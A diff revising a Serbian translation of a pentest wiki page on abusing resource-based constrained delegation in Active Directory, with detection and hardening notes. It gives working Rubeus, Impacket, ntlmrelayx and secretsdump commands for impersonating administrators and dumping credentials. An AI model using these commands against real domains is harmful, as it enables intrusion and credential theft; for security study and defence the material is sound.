@@ -5,40 +5,40 @@
 
 ## Osnove Resource-based Constrained Delegation
 
-Resource-based constrained delegation (RBCD) sličan je [constrained delegation](constrained-delegation.md), ali je smer poverenja obrnut. Kod tradicionalnog constrained delegation-a beleži se kojim servisima principal može da delegira; RBCD beleži na **ciljnom resursu** koji principal-i mogu da se predstavljaju kao korisnici tog resursa.<sup>[[12]](#references)</sup>
+Resource-based constrained delegation (RBCD) sličan je [constrained delegation](constrained-delegation.md), ali je smer poverenja obrnut. Kod tradicionalne constrained delegation beleži se kojim servisima principal može da delegira; kod RBCD se na **ciljnom resursu** beleži koji principali mogu da se predstavljaju kao korisnici pri pristupu tom resursu.<sup>[[12]](#references)</sup>
 
-Atribut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ objekta cilja sadrži bezbednosni deskriptor koji identifikuje principal-e kojima je dozvoljeno da deluju u ime drugih identiteta na tom resursu.
+Atribut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ ciljnog objekta sadrži bezbednosni deskriptor koji identifikuje principale kojima je dozvoljeno da deluju u ime drugih identiteta na tom resursu.
 
-Još jedna važna razlika je u tome što principal sa dovoljnim **write dozvolama nad mašinskim nalogom** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` i sličnim pravima) može da postavi atribut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Konfigurisanje tradicionalnog constrained delegation-a obično zahteva privilegovaniji administrativni pristup.<sup>[[1]](#references)</sup>
+Još jedna važna razlika je u tome što principal sa dovoljnim **dozvolama za pisanje nad računom računara** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` i sličnim pravima) možda može da postavi _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Za konfigurisanje tradicionalne constrained delegation obično je potreban privilegovaniji administrativni pristup.<sup>[[1]](#references)</sup>
 
-Preciznije, izmene podešavanja klasičnog constrained delegation-a obično su ograničene pravom `SeEnableDelegationPrivilege` na kontroleru domena, koje najčešće imaju visoko privilegovani administratori. RBCD prebacuje odluku na bezbednosni deskriptor ciljnog objekta, pa write pristup relevantnom svojstvu objekta računara može biti dovoljan i bez tog korisničkog prava.<sup>[[1]](#references)[[2]](#references)</sup>
+Preciznije, izmena postavki klasične constrained delegation obično je uslovljena pravom `SeEnableDelegationPrivilege` na kontroleru domena, koje najčešće imaju samo administratori sa visokim privilegijama. RBCD prebacuje odluku na bezbednosni deskriptor ciljnog objekta, pa pristup za pisanje nad relevantnim svojstvom objekta računara može biti dovoljan, bez tog korisničkog prava.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ### Novi koncepti
 
 Zastavica **`TrustedToAuthForDelegation`** u `userAccountControl` često se opisuje kao preduslov za **S4U2Self**, ali to nije sasvim tačno.\
-Service principal sa SPN-om može da zatraži S4U2Self i bez te zastavice. Kada je postavljena zastavica `TrustedToAuthForDelegation`, vraćena service ticket karta je **forwardable**; bez nje, karta je obično **non-forwardable**.<sup>[[5]](#references)</sup>
+Service principal sa SPN-om može da zatraži S4U2Self i bez te zastavice. Kada je postavljena zastavica `TrustedToAuthForDelegation`, vraćena service ticket je **forwardable**; bez nje je ticket obično **non-forwardable**.<sup>[[5]](#references)</sup>
 
-Tradicionalni constrained delegation odbija **non-forwardable TGS** u koraku S4U2Proxy. RBCD može da prihvati tu S4U2Self kartu ako bezbednosni deskriptor cilja ovlašćuje servis koji podnosi zahtev.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>
+Traditional constrained delegation odbacuje **non-forwardable TGS** u koraku S4U2Proxy. RBCD može da prihvati tu S4U2Self ticket ako bezbednosni deskriptor cilja dozvoljava servis koji podnosi zahtev.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>
 
 ### Struktura napada
 
-> Ako imate **privilegije ekvivalentne write dozvolama** nad **nalogom računara**, možda ćete moći da steknete privilegovani pristup toj mašini.
+> Ako imate **privilegije ekvivalentne dozvoli za pisanje** nad **računom računara**, možda ćete moći da ostvarite privilegovan pristup toj mašini.
 
-Pretpostavimo da napadač već ima **privilegije ekvivalentne write dozvolama nad objektom računara žrtve**.
+Pretpostavimo da napadač već ima **privilegije ekvivalentne dozvoli za pisanje nad objektom računara žrtve**.
 
-1. Napadač **kompromituje** nalog sa **SPN-om** ili ga **kreira** („Service A“). Podrazumevano, autentifikovani korisnik domena može da kreira najviše 10 objekata računara, u skladu sa podešavanjem **_MachineAccountQuota_**; objekat računara automatski obezbeđuje upotrebljive SPN-ove.
-2. Napadač **zloupotrebljava svoju WRITE privilegiju** nad računarom žrtve (ServiceB) da konfiguriše **resource-based constrained delegation tako da ServiceA može da se predstavlja kao bilo koji korisnik** u odnosu na taj računar žrtve (ServiceB).
+1. Napadač **kompromituje** nalog sa **SPN-om** ili ga **kreira** („Service A“). Podrazumevano, autentifikovani korisnik domena može da kreira najviše 10 objekata računara, u skladu sa postavkom **_MachineAccountQuota_**; objekat računara automatski obezbeđuje upotrebljive SPN-ove.
+2. Napadač **zloupotrebljava svoju WRITE privilegiju** nad računarom žrtve (ServiceB) da bi konfigurisao **resource-based constrained delegation tako da ServiceA može da se predstavlja kao bilo koji korisnik** u odnosu na taj računar žrtve (ServiceB).
 3. Napadač koristi Rubeus da izvrši **potpuni S4U napad** (S4U2Self i S4U2Proxy) sa Service A na Service B za korisnika **koji ima privilegovan pristup Service B**.
-   1. S4U2Self (sa kompromitovanog ili kreiranog SPN naloga): zatraži **TGS kartu koja predstavlja Administrator-a za Service A** (non-forwardable).
-   2. S4U2Proxy: upotrebi tu **non-forwardable TGS kartu** da zatraži service ticket kartu koja predstavlja **Administrator-a** na **računaru žrtve**.
-   3. Non-forwardable karta i dalje može da funkcioniše u ovom RBCD toku jer je Service A ovlašćen u bezbednosnom deskriptoru ciljnog resursa.
-4. Napadač može da izvrši **pass-the-ticket** i da se **predstavlja kao** korisnik kako bi stekao **pristup ServiceB žrtve**.<sup>[[1]](#references)</sup>
+   1. S4U2Self (sa kompromitovanog ili kreiranog naloga sa SPN-om): zatražiti **TGS koji predstavlja Administratora za Service A** (non-forwardable).
+   2. S4U2Proxy: upotrebiti taj **non-forwardable TGS** za zahtev za service ticket koja predstavlja **Administratora** na **računaru žrtve**.
+   3. Non-forwardable ticket i dalje može da funkcioniše u ovom RBCD toku jer je Service A ovlašćen u bezbednosnom deskriptoru ciljnog resursa.
+4. Napadač može da izvrši **pass-the-ticket** i **da se predstavlja kao** korisnik kako bi ostvario **pristup računaru žrtve ServiceB**.<sup>[[1]](#references)</sup>
 
-`MachineAccountQuota=0` onemogućava podrazumevani način kreiranja računara, ali ne uklanja write prava nad objektom ciljnog računara niti kontrolu nad postojećim nalogom. Kontrolisani običan korisnik bez SPN-a ponekad može da se upotrebi kao principal koji delegira, putem metode [SPN-less U2U](#spn-less-cross-domain--cross-forest-rbcd), uključujući i unutar jednog domena. Za taj put su i dalje potrebni efektivno RBCD write pravo, kontrola nad akreditivima korisnika koji delegira, identitet koji se može delegirati, kompatibilno ponašanje Kerberos enkripcije i promena NT hash-a koja onemogućava nalog. Tretirajte ih kao odvojene preduslove; prazan RBCD atribut ili nulta kvota sami po sebi ne dokazuju ni uspeh ni bezbednost.
+`MachineAccountQuota=0` onemogućava podrazumevani način kreiranja računara, ali ne uklanja dozvole za pisanje nad ciljnim objektom računara niti kontrolu nad postojećim nalogom. Kontrolisani običan korisnik bez SPN-a ponekad se može koristiti kao principal koji delegira putem [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd), uključujući i slučaj kada se sve odvija unutar jednog domena. Za taj način su i dalje potrebni efektivno pravo za pisanje RBCD, kontrola nad akreditivima korisnika koji delegira, identitet koji može biti delegiran, kompatibilno ponašanje Kerberos enkripcije i promena NT hash-a koja ometa nalog. Tretirajte ih kao odvojene preduslove; prazan RBCD atribut ili nulta kvota sami po sebi ne dokazuju ni uspeh ni bezbednost.
 
-Postojeći RBCD deskriptor može da navodi i **grupu**, umesto direktno računara koji delegira. Ako kontrolišete nalog računara koji ima SPN i možete da ga dodate u tu grupu, novo članstvo može da obezbedi put za delegaciju bez izmene RBCD atributa ciljnog računara. Pre nego što zaključite da put funkcioniše, proverite efektivnu ACL za upis članstva u grupu (uključujući deny ACE), ugnježdeno članstvo i osvežavanje tokena, SID trustee-ja u deskriptoru, ograničenja delegacije za nalog koji se impersonira i SPN ciljnog servisa.
+Postojeći RBCD deskriptor može da navodi i **grupu**, a ne direktno računar koji delegira. Ako kontrolišete nalog računara sa SPN-om i možete da ga dodate u tu grupu, novo članstvo može da omogući put za delegaciju bez izmene RBCD atributa ciljnog računara. Pre zaključka da li taj put funkcioniše, proverite efektivnu ACL za upisivanje članova grupe (uključujući deny ACE-ove), ugnježdeno članstvo i osvežavanje tokena, SID trustee-a u deskriptoru, ograničenja delegacije za nalog koji se impersonira i SPN ciljnog servisa.
 
-Da biste proverili _**MachineAccountQuota**_ domena, možete da upotrebite:
+Da biste proverili _**MachineAccountQuota**_ domena, možete koristiti:
 
 ```bash
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
@@ -48,7 +48,7 @@ Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select Ma
 
 ### Kreiranje računarskog objekta
 
-Možete da kreirate računarski objekat u okviru domena pomoću **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
+Možete kreirati računarski objekat unutar domena pomoću **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
 
 ```bash
 import-module powermad
@@ -58,9 +58,9 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 Get-DomainComputer SERVICEA
 ```
 
-### Konfigurisanje delegiranja sa ograničenjem zasnovanog na resursima
+### Konfigurisanje delegiranja ograničenog na osnovu resursa
 
-**Korišćenjem Active Directory PowerShell modula**<sup>[[4]](#references)</sup>
+**Korišćenjem PowerShell modula za Active Directory**<sup>[[4]](#references)</sup>
 
 ```bash
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
@@ -84,33 +84,33 @@ msds-allowedtoactonbehalfofotheridentity
 {1, 0, 4, 128...}
 ```
 
-### Izvođenje kompletnog S4U napada (Windows/Rubeus)
+### Izvođenje potpunog S4U attack-a (Windows/Rubeus)
 
-Najpre smo kreirali novi objekat računara sa lozinkom `123456`, pa nam je potreban hash te lozinke:<sup>[[3]](#references)[[4]](#references)</sup>
+Najpre smo kreirali novi Computer objekat sa lozinkom `123456`, pa nam je potreban hash te lozinke:<sup>[[3]](#references)[[4]](#references)</sup>
 
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
 
-Ovo će ispisati RC4 i AES hash-eve za taj nalog.\
-Sada se napad može izvesti:<sup>[[3]](#references)[[4]](#references)</sup>
+Ovo će prikazati RC4 i AES hash vrednosti za taj nalog.\
+Sada se napad može izvršiti:<sup>[[3]](#references)[[4]](#references)</sup>
 
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
 
-Možete generisati više tickets za više servisa jednim zahtevom, koristeći parametar `/altservice` u Rubeus-u:
+Možete generisati više tiketa za više servisa jednim zahtevom, koristeći parametar `/altservice` u alatu Rubeus:
 
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 
 > [!CAUTION]
-> Korisnici mogu biti označeni kao **„Nalog je osetljiv i ne može se delegirati.“** Ako je ova zastavica omogućena, nalog se ne može impersonirati kroz ovaj tok delegacije. BloodHound prikazuje ovo svojstvo tokom analize.
+> Korisnici mogu biti označeni kao **„Nalog je osetljiv i ne može mu se delegirati.“** Ako je ova zastavica omogućena, nalog se ne može impersonirati kroz ovaj tok delegiranja. BloodHound prikazuje ovo svojstvo tokom analize.
 
-### Linux alati: RBCD od početka do kraja pomoću Impacket-a (2024+)
+### Linux alati: RBCD lanac od početka do kraja uz Impacket (2024+)
 
-Ako radite iz Linux-a, možete izvršiti ceo RBCD lanac pomoću zvaničnih Impacket alata:<sup>[[6]](#references)[[7]](#references)</sup>
+Ako radite iz Linuxa, možete izvršiti ceo RBCD lanac pomoću zvaničnih Impacket alata:<sup>[[6]](#references)[[7]](#references)</sup>
 
 ```bash
 # 1) Create attacker-controlled machine account (respects MachineAccountQuota)
@@ -129,20 +129,20 @@ export KRB5CCNAME=$(pwd)/Administrator.ccache
 impacket-secretsdump -k -no-pass Administrator@victim.domain.local
 ```
 
-Napomene
-- Ako je LDAP signing/LDAPS obavezno, koristite `impacket-rbcd -use-ldaps ...`.
-- Dajte prednost AES ključevima; mnogi moderni domeni ograničavaju RC4. Impacket i Rubeus podržavaju tokove koji koriste samo AES.
+Beleške
+- Ako je LDAP signing/LDAPS obavezan, koristite `impacket-rbcd -use-ldaps ...`.
+- Dajte prednost AES ključevima; mnogi savremeni domeni ograničavaju RC4. Impacket i Rubeus podržavaju tokove koji koriste samo AES.
 - Impacket može da prepiše `sname` („AnySPN“) za neke alate, ali kad god je moguće, pribavite ispravan SPN (npr. CIFS/LDAP/HTTP/HOST/MSSQLSvc).
 
 ## RBCD između domena i šuma
 
-Ako se **principal koji delegira** i koji kontrolišete nalazi u **drugom domenu** (ili čak **drugom šumu**) od računara koji predstavlja resurs, zloupotreba je i dalje **RBCD**, ali tok tiketa više nije uobičajeni `S4U2Self -> S4U2Proxy` unutar jednog domena.
+Ako se **delegirajući principal** kojim upravljate nalazi u **drugom domenu** (ili čak u **drugom šumu**) u odnosu na **računar resursa**, zloupotreba i dalje predstavlja **RBCD**, ali tok tiketa više nije uobičajeni `S4U2Self -> S4U2Proxy` unutar jednog domena.
 
 ### RBCD između domena: konfigurisanje stranog principala pomoću SID-a
 
-Kada podešavate `msDS-AllowedToActOnBehalfOfOtherIdentity` iz **drugog domena**, stranu mašinu/korisnika možda **neće biti moguće razrešiti po imenu** u LDAP-u ciljnog domena. U tom slučaju, konfigurišite stavku delegiranja pomoću **SID-a** stranog principala, а не его sAMAccountName/UPN.
+Kada podešavate `msDS-AllowedToActOnBehalfOfOtherIdentity` iz **drugog domena**, strani računar/korisnik možda **neće moći da se razreši po imenu** u LDAP-u ciljnog domena. U tom slučaju podesite unos delegiranja pomoću **SID-a** stranog principala umesto njegovog sAMAccountName/UPN-a.
 
-Это особенно актуально при ретрансляции NTLM в LDAP с помощью `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
+Ovo je posebno važno prilikom relay-a NTLM-а ka LDAP-u pomoću `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
 
 ```bash
 sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
@@ -153,27 +153,27 @@ sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
 ```
 
 Napomene:
-- `--sid` govori alatu `ntlmrelayx.py` da tretira `--escalate-user` kao SID, što je neophodno kada je delegirajući nalog iz drugog domena od ciljnog.
-- Čak i ako alat ispiše `User not found in LDAP`, upis delegacije i dalje može uspeti jer bezbednosni deskriptor direktno čuva strani SID.
+- `--sid` govori alatu `ntlmrelayx.py` da tretira `--escalate-user` kao SID, što je neophodno kada delegirajući nalog pripada drugom domenu.
+- Čak i ako alat prikaže `User not found in LDAP`, upis delegiranja i dalje može uspeti jer se strani SID direktno čuva u security descriptor-u.
 
 ### RBCD između domena: S4U sekvenca između realm-ova
 
-Kada se strani principal nađe u `msDS-AllowedToActOnBehalfOfOtherIdentity`, funkcionalni tok između domena izgleda ovako:<sup>[[9]](#references)[[13]](#references)</sup>
+Kada se strani principal nađe u `msDS-AllowedToActOnBehalfOfOtherIdentity`, funkcionalni tok između domena je sledeći:<sup>[[9]](#references)[[13]](#references)</sup>
 
 1. Preuzmite **TGT** za delegirajući principal iz njegovog domena.
 2. Zatražite **referral TGT** za `krbtgt/<target-domain>`.
-3. Zatražite **cross-realm S4U2Self referral** za korisnika čiju личност treba impersonirati na DC-ju ciljnog domena.
-4. Zatražite stvarni **S4U2Self** ticket za tog korisnika nazad u delegator domenu.
-5. Izvršite **S4U2Proxy** u delegator domenu da biste dobili referral ticket za ciljni domen.
-6. Izvršite završni **S4U2Proxy** na DC-ju ciljnog domena da biste dobili service ticket za `cifs/host.target`, `host/host.target` itd.
+3. Zatražite **cross-realm S4U2Self referral** za korisnika koji se impersonira na DC-u ciljnog domena.
+4. Zatražite stvarni **S4U2Self** ticket za tog korisnika nazad u domenu delegirajućeg principala.
+5. Obavite **S4U2Proxy** u domenu delegirajućeg principala da biste dobili referral ticket za ciljni domen.
+6. Obavite završni **S4U2Proxy** na DC-u ciljnog domena da biste dobili service ticket za `cifs/host.target`, `host/host.target` itd.
 
-Zbog toga standardni Linux alati često ne uspevaju sa cross-domain RBCD:<sup>[[9]](#references)</sup>
-- **realm** zahteva možda mora da se razlikuje od realm-a TGT-ja korišćenog u `TGS-REQ`
-- lanac zahteva **nezavisne S4U2Proxy korake**, a ne samo `S4U2Self` ili `S4U2Self` praćen jednim `S4U2Proxy` korakom
+Zbog toga standardni Linux alati često ne uspevaju kod RBCD-a između domena:<sup>[[9]](#references)</sup>
+- **realm** zahteva možda mora da se razlikuje od realm-a TGT-a korišćenog u `TGS-REQ`
+- lanac zahteva **nezavisne S4U2Proxy korake**, a ne samo `S4U2Self` ili `S4U2Self` praćen jednim `S4U2Proxy`
 
-### Cross-domain RBCD iz Linux-a
+### RBCD između domena iz Linuxa
 
-Synacktiv je objavio Impacket implementaciju `getST.py` koja reprodukuje cross-realm sekvencu iz Linux-a tako što eksplicitno obrađuje dva KDC-ja:<sup>[[9]](#references)[[11]](#references)</sup>
+Synacktiv je objavio implementaciju Impacket-ovog `getST.py` koja ponavlja sekvencu između realm-ova iz Linuxa tako što eksplicitno obrađuje oba KDC-a:<sup>[[9]](#references)[[11]](#references)</sup>
 
 ```bash
 python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
@@ -190,36 +190,36 @@ KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
 
 Operativno, novi argumenti su:
 - `-dc-ip`: DC delegirajućeg domena
-- `-targetdomain`: domen računara resursa
+- `-targetdomain`: domen računara-resursa
 - `-targetdc`: DC domena resursa
 
 ### Ograničenja RBCD-a između šuma
 
-RBCD između šuma ima važno ograničenje: **impersonirani korisnik mora pripadati istom šumu kao i delegirajući principal**. Drugim rečima, ako je vaš kontrolisani račun računara u `valhalla.local`, a ciljni resurs u `asgard.local`, uglavnom **ne možete impersonirati proizvoljne korisnike iz `asgard.local` na tom resursu putem RBCD-a**.<sup>[[9]](#references)</sup>
+RBCD između šuma ima važno ograničenje: **impersonifikovani korisnik mora da pripada istoj šumi kao i delegirajući principal**. Drugim rečima, ako je nalog računara pod vašom kontrolom u `valhalla.local`, a ciljni resurs u `asgard.local`, uglavnom **ne možete da impersonifikujete proizvoljne korisnike iz `asgard.local` na tom resursu putem RBCD-a**.<sup>[[9]](#references)</sup>
 
-I dalje je moguće iskoristiti ovu tehniku kada:
-- je korisnik iz **delegirajućeg šuma** **local admin** (ili na drugi način ima povišene privilegije) na hostu resursa u drugom šumu
-- trust omogućava neophodan put autentifikacije, a strani SID je prihvaćen u deskriptoru bezbednosti ciljnog računara
+I dalje se može iskoristiti kada:
+- je korisnik iz **delegirajuće šume** **local admin** (ili na drugi način ima povišene privilegije) na hostu resursa u drugoj šumi
+- trust omogućava neophodan put za autentifikaciju, a SID iz druge šume je prihvaćen u bezbednosnom deskriptoru ciljnog računara
 
-### Specifičnosti RBCD protokola između šuma
+### Specifičnosti protokola RBCD-a između šuma
 
-RBCD između šuma nije samo „između domena uz trust“. Uočeni tok uključuje dve specifičnosti koje uobičajeni alati istorijski nisu uzimali u obzir:<sup>[[9]](#references)</sup>
+RBCD između šuma nije samo „između domena uz trust“. Uočeni tok obuhvata dve specifičnosti koje uobičajeni alati ranije nisu uzimali u obzir:<sup>[[9]](#references)</sup>
 
 1. Dodatni zahtev **S4U2Proxy** koji postavlja **`PA-PAC-OPTIONS=branch-aware`**
-2. Završna servisna karta može biti vraćena korišćenjem **RC4**, čak i kada su zatraženi drugi tipovi šifrovanja
+2. Završna servisna karta koja može biti vraćena korišćenjem **RC4**, čak i kada su zatraženi drugi tipovi šifrovanja
 
-Praktični tok je sledeći:
+Praktičan tok je:
 
-1. Preuzmite TGT za delegirajući principal u šumu A.
-2. Zatražite **S4U2Self** za impersoniranog korisnika u šumu A.
-3. Zatražite **S4U2Proxy** u šumu A da biste dobili referral TGT za šumu B.
-4. Pošaljite drugi zahtev **S4U2Proxy** u šumu A **bez S4U2Self karte kao dodatne karte**, ali sa uključenom opcijom `branch-aware`, da biste dobili još jedan referral TGT za šumu B.
-5. Opciono, zatražite običnu servisnu kartu u šumu B za delegirajući principal (ova karta nije neophodna za završnu zloupotrebu).
-6. Upotrebite referral karte iz koraka 3 i 4 da biste zatražili završnu kartu **S4U2Proxy** u šumu B za korisnika iz šuma A koji se impersonira, prema ciljnom SPN-u.
+1. Dobavite TGT za delegirajući principal u šumi A.
+2. Zatražite **S4U2Self** za impersonifikovanog korisnika u šumi A.
+3. Zatražite **S4U2Proxy** u šumi A da biste dobili referral TGT za šumu B.
+4. Pošaljite drugi zahtev **S4U2Proxy** u šumi A **bez karte S4U2Self kao dodatne karte**, ali sa uključenim `branch-aware`, da biste dobili još jedan referral TGT za šumu B.
+5. Po želji, zatražite uobičajenu servisnu kartu u šumi B za delegirajući principal (ova karta nije neophodna za završnu zloupotrebu).
+6. Upotrebite referral karte iz koraka 3 i 4 da biste zatražili završnu kartu **S4U2Proxy** u šumi B za korisnika iz šume A koji se impersonifikuje, prema ciljnom SPN-u.
 
 ### RBCD između šuma iz Linuxa
 
-Ista Synacktiv grana Impacket-a dodaje prekidač `-forest` za ovu logiku:<sup>[[9]](#references)[[11]](#references)</sup>
+Ista grana Synacktiv Impacket-a dodaje prekidač `-forest` za ovu logiku:<sup>[[9]](#references)[[11]](#references)</sup>
 
 ```bash
 python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
@@ -234,11 +234,11 @@ python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
 
 ### Rekurzivni RBCD u više domena (3+ domena)
 
-U **šumama sa više domena**, i **S4U2Self** i **S4U2Proxy** mogu biti **rekurzivni**, umesto da se zaustave nakon jednog upućivanja:
+U **šumama sa više domena**, i **S4U2Self** i **S4U2Proxy** mogu biti **rekurzivni**, umesto da se zaustave nakon jednog preusmeravanja:
 
-- **Rekurzivni S4U2Self**: prvi `S4U2Self` šalje se u **domen korisnika čiji se identitet preuzima**, prolazi se kroz međukorake nadređenih/podređenih domena uz uobičajena `TGS-REQ` upućivanja za `krbtgt/<REALM>`, a **završni `S4U2Self`** šalje se u **domenu delegirajućeg principal-a**.
-- To znači da **samo posedovanje TGT-a** za machine account može biti dovoljno da se preuzme identitet **administratora iz drugog domena u istoj šumi** i zatraži `cifs/host`, `host/host`, `wsman/host` itd.
-- **Rekurzivni S4U2Proxy** prati isti lanac poverenja: međukoraci ponovo koriste prethodnu kartu kao TGT dok traže upućivanje `krbtgt/<REALM>` ka sledećem domenu, a završnu service ticket vraća tek poslednji korak.<sup>[[10]](#references)</sup>
+- **Rekurzivni S4U2Self**: prvi `S4U2Self` šalje se u **domen korisnika koji se impersonira**, prolazi se kroz posredne nadređene/podređene hopove pomoću uobičajenih `TGS-REQ` preusmeravanja za `krbtgt/<REALM>`, a **poslednji `S4U2Self`** šalje se u **sopstvenom domenu delegirajućeg principala**.
+- To znači da **samo posedovanje TGT-a** za nalog računara može biti dovoljno za impersoniranje **administratora iz drugog domena u istoj šumi** i zahtevanje `cifs/host`, `host/host`, `wsman/host` itd.
+- **Rekurzivni S4U2Proxy** prati lanac poverenja na isti način: posredni hopovi ponovo koriste prethodnu kartu kao TGT dok zahtevaju sledeće `krbtgt/<REALM>` preusmeravanje, a samo poslednji hop vraća konačnu servisnu kartu.<sup>[[10]](#references)</sup>
 
 Praktičan primer u istoj šumi je:
 
@@ -253,15 +253,15 @@ KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.loc
 
 ### RBCD bez SPN-a između domena / šuma
 
-Ako je **delegirajući principal korisnik bez SPN-a**, poslednji rekurzivni `S4U2Self` ne uspeva uz grešku **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Rešenje je da se **ponovi samo poslednji korak pomoću `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>
+Ako je **delegirajući principal korisnik bez SPN-a**, poslednji rekurzivni `S4U2Self` ne uspeva uz grešku **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Rešenje je da se **ponovi samo poslednji korak kao `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>
 
 Ukratko, lanac zloupotrebe:
 
-1. Autentifikujte se pomoću **NT hash-a** kako bi KDC koristio **RC4-HMAC (etype 23)**.
-2. Prvo zatražite **`-self -u2u`** i sačuvajte taj ticket odvojeno od kasnijeg proxy koraka.
+1. Autentifikujte se pomoću **NT hash-a** kako biste naveli KDC da koristi **RC4-HMAC (etype 23)**.
+2. Najpre zatražite **`-self -u2u`** i sačuvajte ovu kartu odvojeno od kasnijeg proxy koraka.
 3. Izdvojite **ključ sesije TGT-a** pomoću `describeTicket.py`.
 4. Zamenite korisnikov **NT hash** tim **ključem sesije** pomoću `changepasswd.py -newhashes <session_key>`.
-5. Ponovo upotrebite ticket `S4U2Self+U2U` kao **`-additional-ticket`** tokom zasebnog zahteva **`-proxy`**.
+5. Ponovo upotrebite kartu `S4U2Self+U2U` kao **`-additional-ticket`** tokom zasebnog zahteva **`-proxy`**.
 
 ```bash
 getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
@@ -276,33 +276,33 @@ KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-
 
 Operativne napomene:
 
-- Kada je **prvi pouzdani hop već druga šuma**, prednost dajte algoritmu koji uzima u obzir grane (`getST.py ... -forest`) kako bi se podudaralo s izvornim ponašanjem Windowsa. Ako se do strane šume stiže tek **kasnije** u lancu, nerekurzivni tok koji ne uzima u obzir grane i dalje može da funkcioniše.<sup>[[9]](#references)</sup>
-- Na novijim DC-ovima sa **Windows Server 2022/2025**, forsirani RC4 može da ne uspe uz grešku **`KDC_ERR_ETYPE_NOSUPP`** zbog zastarevanja RC4; zbog toga **RBCD bez SPN-a** može biti nemoguć, iako klasični RBCD zasnovan na SPN-u i dalje radi uz AES.<sup>[[15]](#references)</sup>
-- Pokrenite **`S4U2Self+U2U` pre promene heša/lozinke korisnika**: **`SamrChangePasswordUser`** ne izračunava ponovo Kerberos AES ključeve naloga, pa promena lozinke pre toga može da prekine kasnije zahteve za tiketima.<sup>[[14]](#references)</sup>
-- Lažni nalog i dalje mora da bude **delegabilan**: **Protected Users** i nalozi sa **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** blokiraju lanac.
+- Kada je **prvi pouzdani hop već druga forest**, prednost dajte **branch-aware** algoritmu (`getST.py ... -forest`) da biste se ponašali kao izvorni Windows. Ako se do strane forest stigne tek **kasnije** u lancu, nerekurzivni tok koji nije branch-aware i dalje može da funkcioniše.<sup>[[9]](#references)</sup>
+- Na novijim **Windows Server 2022/2025** DC-ovima, forsirani RC4 može da ne uspe uz **`KDC_ERR_ETYPE_NOSUPP`** zbog zastarevanja RC4; zbog toga **RBCD bez SPN-a može biti nemoguć**, iako klasični RBCD zasnovan na SPN-u i dalje radi uz AES.<sup>[[15]](#references)</sup>
+- Pokrenite **`S4U2Self+U2U` pre promene korisnikovog hash-a/lozinke**: `SamrChangePasswordUser` **ne preračunava Kerberos AES ključeve naloga**, pa promena lozinke pre toga može da pokvari kasnije zahteve za tikete.<sup>[[14]](#references)</sup>
+- Imitirani nalog i dalje mora da bude **delegabilan**: **Protected Users** i nalozi sa **`NOT_DELEGATED`** / **„Account is sensitive and cannot be delegated“** blokiraju lanac.
 
-## Napomene o detekciji / ojačavanju
+## Napomene o detekciji / ojačavanju bezbednosti
 
-- RBCD putanje kroz domene/šume obično se i dalje uspostavljaju zloupotrebom **ACL-a** ili **relay-to-LDAP**. Nametnite **LDAP signing** i **LDAP channel binding** na DC-ovima da biste prekinuli uobičajene načine uspostavljanja.
-- Proverite ko može da upisuje `msDS-AllowedToActOnBehalfOfOtherIdentity` na računarskim objektima i razrešite sačuvane SID-ove, uključujući **strane bezbednosne principal-e**.
-- U okruženjima sa mnogo poverenja pregledajte **Selective Authentication**, **SID filtering** i da li korisnici iz strane šume imaju prava **lokalnog administratora** na hostovima sa resursima.
+- RBCD putanje između domena/forest-a i dalje se obično uspostavljaju zloupotrebom **ACL-ova** ili putem **relay-to-LDAP**. Sprovedite **LDAP signing** i **LDAP channel binding** na DC-ovima da biste onemogućili uobičajene načine uspostavljanja.
+- Proverite ko može da upisuje `msDS-AllowedToActOnBehalfOfOtherIdentity` na computer objektima i razrešite sačuvane SID-ove, uključujući **foreign security principals**.
+- U okruženjima sa mnogo trust-ova proverite **Selective Authentication**, **SID filtering** i da li korisnici iz strane forest imaju prava **local admin** na hostovima resursa.
 
 ### Pristupanje
 
-Poslednja komandna linija izvršava **kompletan S4U napad i ubacuje TGS** od Administratora ka hostu žrtve u **memoriju**.\
-U ovom primeru zatražen je TGS za uslugu **CIFS** od Administratora, pa ćete moći da pristupite **C$**:
